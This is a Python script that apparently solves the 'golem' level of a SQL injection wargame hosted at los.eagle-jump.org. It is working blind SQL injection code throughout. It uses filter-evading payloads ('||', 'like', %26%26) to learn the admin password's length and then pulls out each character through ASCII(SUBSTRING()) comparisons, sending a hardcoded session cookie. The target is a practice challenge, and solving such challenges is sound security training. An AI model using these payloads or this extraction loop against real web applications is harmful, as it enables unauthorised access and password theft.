import requests
import string

def lenth():
    lenc=0
    for i in range(1,100):
        param = "?pw=' || id like 'admin' %26%26 LENGTH(pw) like " + str(i) + "%23#"
        print("[+]pay : %s " % param)
        new_url = url + param
        r = requests.get(new_url, cookies=cookies)
        if r.text.find("Hello admin") > 0:
            print("[+]pw's length : " + str(i))
            lenc=i
            break
    return lenc

def guess(leng):
    global pw
    for i in range(1,leng+1):
        print ("[+] i : %d" % i)
        for j in string:
            tmp = "?pw=a' || id like 'admin' %26%26 ASCII(SUBSTRING(pw, " + str(i) + ", 1)) like " + str(ord(j)) + "%23#"
            #tmp = "?pw=a' or id='admin' and ASCII(SUBSTR(pw, {}, 1))={}%23".join(str(i),str(ord(j) ))
            print ("[+]pay : %s " % tmp)
            u = url + tmp
            t = requests.get(u, cookies=cookies)
            if t.text.find("Hello admin") > 0:
                pw = pw + j
                print("[+] Pw : %s " % pw)
                break

if __name__== '__main__':
    url = "http://los.eagle-jump.org/golem_39f3348098ccda1e71a4650f40caa037.php"
    cookies = dict(PHPSESSID="i7a8fl56iv24kbpa9vuuk3nll7")
    string = abc = string.digits + string.ascii_letters
    pw = ''

    lent = lenth()
    guess(lent)
    print("[+] Pw : %s " % pw)